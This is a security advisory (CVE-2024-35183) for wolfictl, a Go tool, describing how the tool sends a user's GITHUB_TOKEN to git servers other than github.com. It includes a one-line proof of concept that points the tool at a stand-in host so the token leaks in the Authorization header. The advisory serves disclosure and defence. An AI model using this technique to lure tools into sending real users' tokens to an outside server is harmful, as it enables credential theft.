# [M] wolfictl leaks GitHub tokens to remote non-GitHub git servers

## Summary
Severity: Medium
Advisory: GHSA-8fg7-hp93-qhvr
CVE: CVE-2024-35183
CWE: CWE-552, CWE-668
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-05-15
Source: https://github.com/advisories/GHSA-8fg7-hp93-qhvr
Type: github-advisory

## Affected
- Go: `github.com/wolfi-dev/wolfictl` — affected >=0 <0.16.10

## Details
### Summary

A git authentication issue allows a local user’s GitHub token to be sent to remote servers other than `github.com`.

### Details

Most git-dependent functionality in wolfictl relies on its own `git` package, which contains centralized logic for implementing interactions with git repositories. Some of this functionality requires authentication in order to access private repositories. There’s a central function `GetGitAuth`:

https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22

This looks for a GitHub token in the environment variable `GITHUB_TOKEN` and returns it as an HTTP basic auth object to be used with the `github.com/go-git/go-git/v5` library.

Most callers (direct or indirect) of `GetGitAuth` use the token to authenticate to github.com only; however, in some cases callers were passing this authentication without checking that the remote git repository was hosted on github.com.

#### Issue 1

One of these callers processed git URLs from Melange package configurations, cloning the package’s upstream repository in order to determine which project dependencies have been upgraded since the prior update.

https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49

This issue affects the command `wolfictl check update`, and the set of remote git hosts is a function of the Melange package configuration files residing in the local directory specified in the command.

#### Issue 2

Another caller processes a git URL received as a command line argument and clones the repository to look for new available versions of the given project.

https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143

This issue affects the command `wolfictl update`.

---

This behavior has existed in one form or another since https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0 - committed January 25, 2023.

### PoC

```shell
GITHUB_TOKEN=test wolfictl update http://git.example.com/
```

Examining traffic sent to the remote server will show that the HTTP `Authorization` header contains `test` in base64 encoded format.

### Impact

This impacts anyone who ran the `wolfictl check update` commands with a Melange configuration that included a `git-checkout` directive step that referenced a git repository not hosted on github.com. 

This also impacts anyone who ran `wolfictl update <url>` with a remote URL outside of github.com. 

Additionally, these subcommands must have run with the `GITHUB_TOKEN` environment variable set to a valid GitHub token.

## References
- https://github.com/wolfi-dev/wolfictl/security/advisories/GHSA-8fg7-hp93-qhvr
- https://nvd.nist.gov/vuln/detail/CVE-2024-35183
- https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0
- https://github.com/wolfi-dev/wolfictl/commit/403e93569f46766b4e26e06cf9cd0cae5ee0c2a2
- https://github.com/wolfi-dev/wolfictl
- https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143
- https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49
- https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22
